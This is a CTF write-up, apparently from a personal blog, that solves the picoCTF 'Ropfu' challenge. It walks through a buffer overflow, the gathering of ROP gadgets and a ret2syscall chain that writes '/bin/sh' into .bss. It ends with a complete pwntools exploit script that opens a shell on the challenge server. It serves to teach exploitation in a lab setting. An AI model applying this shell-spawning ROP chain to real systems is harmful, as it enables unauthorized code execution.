---
title: "Ropfu"
date: "2025-07-22"
tags: ["picoCTF", "ROP", "buffer overflow", "ret2syscall"]
---

Welcome to the first hard challenge I do from PicoCTF!

This time we get a binary and its code:

```c
./vuln
How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!
Hola
```

The binary just reads an input and closes.

Let's see how that input is read:

```c
  return gets(buf);
```

The program does not limit the size of our input, so it is vulnerable to buffer overflow.

If we look at its protections we can see that PIE is not enabled but there is a canary:

```c
[*] '/home/ub1cu0/Desktop/picoCTF/ropfu/vuln_patched'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

The binary has a canary, but the vulnerable function does not seem to check it, so it does not affect us here.

If we look at it with the `file` command we can see the binary is statically linked:

```c
file vuln
vuln: ELF 32-bit LSB executable, Intel i386, version 1 (GNU/Linux), statically linked, BuildID[sha1]=232215a502491a549a155b1a790de97f0c433482, for GNU/Linux 3.2.0, not stripped
```

This means the binary has gadgets like `int 0x80`, which I will talk about later, that are not usually in libc.

Let's try to find the offset to the return address:

```c
pwn cyclic 30         
aaaabaaacaaadaaaeaaafaaagaaaha

EIP  0x61616168 ('haaa')

cyclic -l haaa

pwndbg> cyclic -l haaa
Finding cyclic pattern of 4 bytes: b'haaa' (hex: 0x68616161)
Found at offset 28 // Offset
```

Now that we have the offset we can send the program wherever we want.

There is no interesting function to call in the code. Since there is no PIE it really looks like we have to do a `ret2syscall`

To do a ret2syscall it is very important to know if the binary is 32 or 64 bits. This one is 32 bits, and that changes things quite a bit. On 64 bits you normally use the `syscall` instruction, but on 32 bits it does not exist as such. Instead you use the `int 0x80` gadget, which is the 32 bit equivalent for invoking a syscall.

Now that we know we have to use `0x80`, how do we use it? `0x80` and `syscall` simply ask the system to do something, and depending on what you pass in rax they can do several things. What interests us is passing `11` in rax, because that tells it we want an execve, which runs a program.

What would the thing we have to build look like?

Since execve is like this:

```c
execve("/bin/sh", NULL, NULL)
```

We would have to do this:

1. Put the number 11 in EAX, so the “syscall” does an execve
2. Put a **POINTER** to `/bin/sh` in EBX
3. Put a null (0x0) in ECX
4. Put a null (0x0) in EDX
5. Go to 0x80 to run the instruction

For this we have to look for gadgets with `pop EAX`, `pop EBX`...etc...and put each thing in its matching register. We can search for them with ROPGadget like this:

```c
ROPgadget --binary vuln | grep -w "pop eax"
. . .
0x080b073a : pop eax ; ret
. . .
```

Now we have the address of a pop for the first register. Let's write down all the addresses of the gadgets we need:

```c
INT_0x80      = 0x0804a3c2
POP_EAX       = 0x080b073a
POP_ECX       = 0x08049e29
POP_EDX_EBX   = 0x080583b9
```

I cheated a little bit here. I found a gadget that does a pop `edx; pop ebx; ret` and I am going to use it to kill two birds with one stone.

It looks like we have everything we need, but we are still missing `/bin/sh`. Here things get harder, because we have to pass it a pointer to where that string lives. To make it worse, we are on 32 bits, and at most 4 bytes fit per stack slot and per register, so the string would not fit even if it let us write it directly.

If we think about it for a moment, we could put `/bin/sh` on the stack at the end of our payload, then find it with the `telescope $rsp 20` command and write down the address where it starts. Sounds good, right? It does, but there is a problem. The remote machine has ASLR on, and that means that stack pointer is going to change on every run.

To get past this obstacle we can try to store our string in the .data or .bss section of the program. Those memory sections do not change with ASLR. This is how it is done

First we have to find the address where one of those memory sections starts. Here I am going to use `.bss` but you can use whichever you want.

With the following command we can see at which address each memory section of the program starts:

```c
readelf -S vuln_patched 

There are 29 section headers, starting at offset 0xace68:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
. . .
 4
  [18] .got.plt          PROGBITS        080e5000 09c000 000044 04  WA  0   0  4
  [19] .data             PROGBITS        080e5060 09c060 000ec0 00  WA  0   0 32
  [20] __libc_subfreeres PROGBITS        080e5f20 09cf20 000024 00  WA  0   0  4
  [21] __libc_IO_vtables PROGBITS        080e5f60 09cf60 000354 00  WA  0   0 32
  [22] __libc_atexit     PROGBITS        080e62b4 09d2b4 000004 00  WA  0   0  4
  [23] .bss              NOBITS          080e62c0 09d2b8 000d1c 00  WA  0   0 32
  [24] __libc_freer[...] NOBITS          080e6fdc 09d2b8 000014 00  WA  0   0  4
. . .
```

The first address column is the one holding the address where the section starts.

Now that we have the address we have to get `/bin/sh` in there. This can be done with the following regex:

```c
pwndbg> rop --grep 'mov .* \[edx\], eax'c
```

This regex looks for gadgets that move something somewhere. Since we have the value we want and the address where we want it, we can put that information in the matching registers and move `/bin/sh` into `.bss`. I picked this gadget:

```c
0x80590f2 : mov dword ptr [edx], eax ; ret
```

What this does is move whatever is in `eax` into `edx`. So we have to get `/bin/sh` into `eax` and the `.bss` address we grabbed earlier into `edx`.

We can put whatever we want into the registers with the same method as before, finding a `pop` gadget for the register we want, but now a new problem shows up. Remember that each register, since we are in a 32 bit binary, can only hold 4 bytes at most, and `/bin/sh` takes more than that because each character is 1 byte. For this we can split our string in 2 and run the mov gadget twice, adding a + 4 the second time to send it 4 bytes above the address of the first round so they do not overlap.

```python
PART1 = u32(b"/bin")
PART2 = u32(b"/sh\x00")
```

With this we have the data and the knowledge we need to build the payload:

```python
#!/usr/bin/env python3
from pwn import *

exe = ELF("./vuln_patched")
context.binary   = exe
context.terminal = ['kitty']

gdb_script = '''
b main
continue
'''

def conn():
    if args.LOCAL:
        p = process(exe.path)
        if args.GDB:
            gdb.attach(p, gdbscript=gdb_script)
    else:
        p = remote("saturn.picoctf.net", 55177)
    return p

# Datos
OFFSET        = 28                           # distancia hasta EIP
INT_0x80      = 0x0804a3c2                   # int 0x80
POP_EAX       = 0x080b073a                   # pop eax ; ret
POP_ECX       = 0x08049e29                   # pop ecx ; ret
POP_EDX_EBX   = 0x080583b9                   # pop edx ; pop ebx ; ret
MOV_EDX_EAX   = 0x080590f2                   # mov dword ptr [edx], eax ; ret
BSS_ADDR      = 0x080e62c0                   # sección .bss

# "/bin/sh" en 2 partes
PART1 = u32(b"/bin")
PART2 = u32(b"/sh\x00")

payload = flat({
    OFFSET: [
        # Primera Parte de "/bin/sh" en .bss
        POP_EDX_EBX,   BSS_ADDR,       0x41414141,    # pop edx ; pop ebx ; ret
        POP_EAX,       PART1,                          # pop eax ; ret
        MOV_EDX_EAX,                                    # mov dword ptr [edx], eax ; ret

        # Segunda Parte de "/bin/sh" en .bss
        POP_EDX_EBX,   BSS_ADDR + 4,   0x41414141,    # pop edx ; pop ebx ; ret
        POP_EAX,       PART2,                          # pop eax ; ret
        MOV_EDX_EAX,                                    # mov dword ptr [edx], eax ; ret

        # execve
        POP_EAX,       0xb,                            # pop eax ; ret
        POP_ECX,       0x0,                            # pop ecx ; ret
        POP_EDX_EBX,   0x0,            BSS_ADDR,       # pop edx ; pop ebx ; ret
        INT_0x80                                        # int 0x80
    ]
})


def main():
    p = conn()
    log.info(f'Payload length: {len(payload)} bytes')
    p.recvuntil(b'!')
    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    main()
```
